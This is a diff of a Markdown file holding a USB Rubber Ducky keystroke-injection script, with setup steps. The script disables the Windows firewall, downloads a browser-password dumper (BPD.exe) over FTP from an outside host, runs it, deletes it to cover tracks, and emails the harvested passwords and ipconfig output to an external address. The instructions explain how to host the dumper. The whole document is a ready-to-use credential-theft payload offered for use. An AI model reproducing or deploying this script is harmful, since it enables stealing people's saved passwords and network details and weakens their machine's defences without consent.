@@ -1,116 +1,63 @@
+```
 DELAY 800
-
 GUI
-
 DELAY 800
-
 STRING Command Prompt
-
 CTRL-SHIFT ENTER
-
 DELAY 1000
-
 ALT y
-
 DELAY 1500
-
 STRING mkdir C:\DuckyReport
-
 ENTER
-
 STRING netsh advfirewall set allprofiles state off
-
 ENTER
-
 STRING ipconfig > C:\DuckyReport\ipconfig.txt
-
 ENTER
-
 STRING cd C:\DuckyReport
-
 ENTER
-
 STRING ftp
-
 ENTER
-
 STRING open ftp.drivehq.com
-
 ENTER
-
 DELAY 2500
-
 STRING YourDriveHQUsername
-
 ENTER
-
 DELAY 2500
-
 STRING YourDriveHQPassword
-
 ENTER
-
 DELAY 2500
-
 STRING get BPD.exe
-
 ENTER
-
 DELAY 8000
-
 STRING close
-
 ENTER
-
 DELAY 800
-
 STRING quit
-
 ENTER
-
 DELAY 800
-
 STRING BPD.exe -f BPD.txt
-
 ENTER
-
 DELAY 2500
-
 STRING del BPD.exe
-
 ENTER
-
 DELAY 800
-
 STRING Exit
-
 ENTER
-
 DELAY 800
-
 GUI
-
 DELAY 1000
-
 STRING Powershell
-
 ENTER
-
 DELAY 1000
-
 STRING $emailSmtpServer = "smtp.gmail.com";$emailSmtpServerPort = "587";$emailSmtpUser = "yourgmailusername@gmail.com";$emailSmtpPass = "YourGmailPassword";$emailMessage = New-Object System.Net.Mail.MailMessage;$emailMessage.From = "DuckyScript Browser Passwords <YourEmailAddressHere@gmail.com>";$emailMessage.To.Add("EmailToSendTo@example.com");$emailMessage.Body = "See attachments";$SMTPClient = New-Object System.Net.Mail.SmtpClient( $emailSmtpServer , $emailSmtpServerPort );$SMTPClient.EnableSsl = $true;$SMTPClient.Credentials = New-Object System.Net.NetworkCredential( $emailSmtpUser , $emailSmtpPass );$attachment = "C:\DuckyReport\BPD.txt";$emailMessage.Attachments.Add($attachment);$attachment2 = "C:\DuckyReport\ipconfig.txt";$emailMessage.Attachments.Add($attachment2);$SMTPClient.Send($emailMessage);
-
 ENTER
-
 DELAY 5000
-
 STRING exit
-
 ENTER
+```
 
 
-
-#Instructions:
+## Instructions:
 1. Create an free account at [https://www.drivehq.com/features/ftp.aspx](https://www.drivehq.com/features/ftp.aspx)
 2. Download BPD.zip and extract it from [https://drive.google.com/file/d/0B8k1o3N-X4vZVjNwZm5ac2hZNFE/view?usp=sharing](https://drive.google.com/file/d/0B8k1o3N-X4vZVjNwZm5ac2hZNFE/view?usp=sharing)
 3. Go to your account and upload BPD.exe to the root directory.
